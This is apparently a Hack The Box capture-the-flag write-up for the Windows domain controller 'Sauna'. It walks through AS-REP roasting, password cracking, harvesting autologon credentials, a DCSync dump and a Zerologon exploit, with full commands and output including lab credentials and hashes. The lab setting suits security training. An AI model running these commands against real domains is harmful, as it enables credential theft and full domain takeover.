---
{"dg-publish":true,"permalink":"/ct-fs/htb/sauna/","dgShowFileTree":true,"dg-note-properties":{}}
---

#windows #web #username-anarchy #autologon #leaked_creds #DCSync 

> [!warning]
> This walkthrough has a way to cheese it. That strategy is below the intended path. Read whichever one interests you.
## Recon
![Pasted image 20261008115603.png](/img/user/CTFs/HTB/Images/Sauna%20Images/Pasted%20image%2020261008115603.png)

### Nmap:
```zsh
nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,9389,49667,49673,49674,49676,49685,49692 -sV -sC -T4 -Pn -oA 10.129.95.180 10.129.95.180
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-08 14:50 -0400
Nmap scan report for 10.129.95.180
Host is up (0.091s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-09 01:50:45Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49685/tcp open  msrpc         Microsoft Windows RPC
49692/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-10-09T01:51:35
|_  start_date: N/A
|_clock-skew: 7h00m02s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.90 seconds

```
Initial port scanning shows a common suite of windows services like LDAP, Kerb, DNS, SMB, MSRPC, and a webserver on port 80. Adding `SAUNA.EGOTISTICAL-BANK.LOCAL` to our hosts file.
### Port 445 (SMB)
#### NXC
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/sauna/scanning]
└─$ nxc smb SAUNA.EGOTISTICAL-BANK.LOCAL -u '' -p '' --shares                                      
SMB         10.129.95.180   445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.95.180   445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\: 
SMB         10.129.95.180   445    SAUNA            [-] Error enumerating shares: STATUS_ACCESS_DENIED
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/CTF/HTB/sauna/scanning]
└─$ nxc smb SAUNA.EGOTISTICAL-BANK.LOCAL -u 'Guest' -p '' --shares
SMB         10.129.95.180   445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.95.180   445    SAUNA            [-] EGOTISTICAL-BANK.LOCAL\Guest: STATUS_ACCOUNT_DISABLED 
```
Checking for null and guest access we find that they're both blocking share access on this server. However, we do learn that Null access is possible for other enumeration, and the system is running Windows 10 / Server 2019 Build 17763 x64.

## Intended Pathway

### Initial Access
#### Web (80)

![Pasted image 20261008123554.png](/img/user/CTFs/HTB/Images/Sauna%20Images/Pasted%20image%2020261008123554.png)
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/sauna/files]
└─$ username-anarchy -i names.txt           
fergus
fergussmith
fergus.smith
fergussm
fergsmit
ferguss
f.smith
fsmith
sfergus
s.fergus
smithf
smith
smith.f
smith.fergus
fs
steven
stevenkerb
steven.kerb
stevenke
stevkerb
stevenk
s.kerb
skerb
ksteven
k.steven
kerbs
kerb
kerb.s
kerb.steven
sk
shaun
shauncoins
shaun.coins
shauncoi
shaucoin
shaunc
s.coins
scoins
cshaun
c.shaun
coinss
coins
coins.s
coins.shaun
sc
bowie
bowietaylor
bowie.taylor
bowietay
bowitayl
bowiet
b.taylor
btaylor
tbowie
t.bowie
taylorb
taylor
taylor.b
taylor.bowie
bt
sophie
sophiedriver
sophie.driver
sophiedr
sophdriv
sophied
s.driver
sdriver
dsophie
d.sophie
drivers
driver
driver.s
dr
```
Visiting the site we find there's a "meet the team" section. So I take the names from that page and run them through [username-anarchy](https://github.com/urbanadventurer/username-anarchy) to generate a list of possible usernames for these individuals.

#### AS-REP Roasting
##### Roasting
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/sauna/files]
└─$ impacket-GetNPUsers egotistical-bank.local/ -usersfile users.txt -no-pass -dc-ip 10.129.95.180 -format john
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
$krb5asrep$fsmith@EGOTISTICAL-BANK.LOCAL:f52a27690322c5deda18de2adfae4b45$95da308767a501348d3d843a859e289ff3d098cca4086fa96c7f1af01b9e74b51baa0d449a4cafbbe33fdac5f82b36656b607939c3231bd58e6c78f62f1596041f1fd18da3ec80e46b60a37cf6e079d081251034d0d21b3125db62b89849d43d93247a4e6182b6c7cba757b025dbd468e5e18e3a748054c4b5d988f5dbdca405e93ff042a4a10ea1d78cb2a6268b358fbf6b75c152a5bbaec29f3bc109f9fc3cc0d1895b8e8b85d162cab38dd171c706015869f9d002a0db161d403cf1459d4127606b175b466ad7e89b95fed99a17bdf4fd84633e598eece8129cd61fc6b12f418f9b9c124929fff471262272911e84ed12713124497efb4f606f182997bcf9
---SNIP---
```
As part of our "low-hanging fruit" checks in windows environments we always check if AS-REP Roasting is possible, and this time, it turns out that it is. We successfully AS-REP Roast user `fsmith`.

>[!info]
>![Pasted image 20261008124005.png](/img/user/CTFs/HTB/Images/Sauna%20Images/Pasted%20image%2020261008124005.png)
> AS-REP Roasting is possible when user accounts have kerberos preauthentication disabled. This means that we can request a user's TGT hash.

##### Cracking the hash
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/sauna/files]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt fsmith.hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Thestrokes23     ($krb5asrep$fsmith@EGOTISTICAL-BANK.LOCAL)     
1g 0:00:00:05 DONE (2026-10-08 15:44) 0.1788g/s 1885Kp/s 1885Kc/s 1885KC/s Thrall..Thehunter22
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
We successfully crack the hash for `fsmith` and get their plaintext password.

##### Profit
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/sauna/files]
└─$ nxc ldap sauna.egotistical-bank.local -u 'fsmith' -p 'Thestrokes23' --groups 'Remote Management Users'
LDAP        10.129.95.180   389    SAUNA            [*] Windows 10 / Server 2019 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:None) (channel binding:No TLS cert) 
LDAP        10.129.95.180   389    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 
LDAP        10.129.95.180   389    SAUNA            FSmith
LDAP        10.129.95.180   389    SAUNA            svc_loanmg
```
We also discover that `fsmith` is a member of the Remote Management Users group which means that this user can get a shell on the system. This user or `svc_loanmg` is our target for `user.txt`.

###### User.txt
```zsh
*Evil-WinRM* PS C:\Users\FSmith\Documents> ls ../Desktop


    Directory: C:\Users\FSmith\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        10/8/2026   6:36 PM             34 user.txt
```
bingo. There is our first flag.

### Privilege Escalation (Autologon & DC Sync Attack)
#### Autologon
```zsh

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials (T1552.002)
    Some AutoLogon credentials were found
    DefaultDomainName             :  EGOTISTICALBANK
    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!

```
One of the first things I then did after gaining a user-level session on the machine was transfer `winPEASx64.exe` from my machine to the target and then run it inside `fsmtih's` Documents folder. It revealed that the `svc_loanmanager` user had stored autologon creds on the server and our script was able to sniff them out.

```zsh
┌──(kali㉿kali)-[/opt/username-anarchy]
└─$ nxc smb SAUNA.EGOTISTICAL-BANK.LOCAL -u 'svc_loanmanager' -p 'Moneymakestheworldgoround!' --shares
SMB         10.129.95.180   445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.95.180   445    SAUNA            [-] EGOTISTICAL-BANK.LOCAL\svc_loanmanager:Moneymakestheworldgoround! STATUS_LOGON_FAILURE
```
Attempting to validate those creds we kept getting logon failure errors. 

```zsh
┌──(kali㉿kali)-[/opt/username-anarchy]
└─$ nxc smb SAUNA.EGOTISTICAL-BANK.LOCAL -u 'fsmith' -p 'Thestrokes23' --users
SMB         10.129.95.180   445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.95.180   445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 
SMB         10.129.95.180   445    SAUNA            -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.129.95.180   445    SAUNA            Administrator                 2021-07-26 16:16:16 0       Built-in account for administering the computer/domain 
SMB         10.129.95.180   445    SAUNA            Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.129.95.180   445    SAUNA            krbtgt                        2020-01-23 05:45:30 0       Key Distribution Center Service Account 
SMB         10.129.95.180   445    SAUNA            HSmith                        2020-01-23 05:54:34 0        
SMB         10.129.95.180   445    SAUNA            FSmith                        2020-01-23 16:45:19 0        
SMB         10.129.95.180   445    SAUNA            svc_loanmgr                   2020-01-24 23:48:31 0
```
Running a user enumeration via `nxc` we find that the username of our target has changed to `svc_loanmgr`.

```zsh
┌──(kali㉿kali)-[/opt/username-anarchy]
└─$ nxc smb SAUNA.EGOTISTICAL-BANK.LOCAL -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!' --shares
SMB         10.129.95.180   445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.95.180   445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\svc_loanmgr:Moneymakestheworldgoround! 
SMB         10.129.95.180   445    SAUNA            [*] Enumerated shares
SMB         10.129.95.180   445    SAUNA            Share           Permissions     Remark
SMB         10.129.95.180   445    SAUNA            -----           -----------     ------
SMB         10.129.95.180   445    SAUNA            ADMIN$                          Remote Admin
SMB         10.129.95.180   445    SAUNA            C$                              Default share
SMB         10.129.95.180   445    SAUNA            IPC$            READ            Remote IPC
SMB         10.129.95.180   445    SAUNA            NETLOGON        READ            Logon server share 
SMB         10.129.95.180   445    SAUNA            print$          READ            Printer Drivers
SMB         10.129.95.180   445    SAUNA            RICOH Aficio SP 8300DN PCL 6 WRITE           We cant print money
SMB         10.129.95.180   445    SAUNA            SYSVOL          READ            Logon server share 

```
With that change we are able to confirm that the stored creds are valid.
#### DC Sync Attack
![Pasted image 20261008132757.png](/img/user/CTFs/HTB/Images/Sauna%20Images/Pasted%20image%2020261008132757.png)
Enumerating bloodhound loot we find that our newly compromised `svc_loanmgr` user has the `GetChangesAll` permission set over the domain. This means we can perform a [dcsync](https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync) attack.

> [!info]
>  ![Pasted image 20261008132938.png](/img/user/CTFs/HTB/Images/Sauna%20Images/Pasted%20image%2020261008132938.png)

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/sauna/loot]
└─$ impacket-secretsdump 'egotistical-bank.local/svc_loanmgr:Moneymakestheworldgoround!@SAUNA.egotistical-bank.local'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
Administrator:des-cbc-md5:fb8f321c64cea87f
krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
krbtgt:des-cbc-md5:c170d5dc3edfc1d9
EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
SAUNA$:aes256-cts-hmac-sha1-96:d7982110e2effab0df3576bc1232329b9b6a60a58229c8af5611af84422caf84
SAUNA$:aes128-cts-hmac-sha1-96:ffe571ff1515a089853a6b05e6b5316e
SAUNA$:des-cbc-md5:23923eae7cdf4334
[*] Cleaning up...
```
We successfully dump the hashes for this DC including the NT hash for the Administrator we we can then use to pass the hash via `evil-winrm` to logon and get `root.txt`. pwned.

## Cheese Strat
### Initial Access & Privesc (zerologon)
#### Zerologon (NXC)
```zsh

┌──(kali㉿kali)-[~/CTF/HTB/sauna]
└─$ nxc smb sauna.egotistical-bank.local -u '' -p '' -M zerologon                                  
/usr/lib/python3/dist-packages/lsassy/impacketfile.py:90: SyntaxWarning: 'return' in a 'finally' block
  return True
SMB         10.129.95.180   445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.95.180   445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\: 
ZEROLOGON   10.129.95.180   445    SAUNA            VULNERABLE
ZEROLOGON   10.129.95.180   445    SAUNA            Next step: https://github.com/dirkjanm/CVE-2020-1472

┌──(kali㉿kali)-[~/CTF/HTB/sauna]
└─$ python3 cve-2020-1472-exploit.py SAUNA 10.129.95.180 
Performing authentication attempts...
===========================================================================================================================================
Target vulnerable, changing account password to empty string

Result: 0

Exploit complete!
                                                                                                                    
┌──(kali㉿kali)-[~/CTF/HTB/sauna]
└─$ impacket-secretsdump -dc-ip 10.129.95.180 -just-dc -no-pass 'SAUNA$'@10.129.95.180
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
Administrator:des-cbc-md5:fb8f321c64cea87f
krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
krbtgt:des-cbc-md5:c170d5dc3edfc1d9
EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
SAUNA$:aes256-cts-hmac-sha1-96:d7982110e2effab0df3576bc1232329b9b6a60a58229c8af5611af84422caf84
SAUNA$:aes128-cts-hmac-sha1-96:ffe571ff1515a089853a6b05e6b5316e
SAUNA$:des-cbc-md5:23923eae7cdf4334
[*] Cleaning up... 

*Evil-WinRM* PS C:\Users\Administrator\Documents> ls ../Desktop


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        10/8/2026   6:36 PM             34 root.txt

```
We run a preliminary enumerative scan and discover the machine is vulnerable to zerologon. We setup the exploit PoC and fire away. pwned...again


## Final Thoughts
>[!Takeaways]
>- Always check for zerologon on windows machines.
>- Always run Winpeas on your target when you can get a session.
>- Always check for autologon stored creds.
>- When validating creds be sure your username is correct (check for a user list with nxc users or rid brute.)
>- secretsdump must be run from a writeable folder to your user.

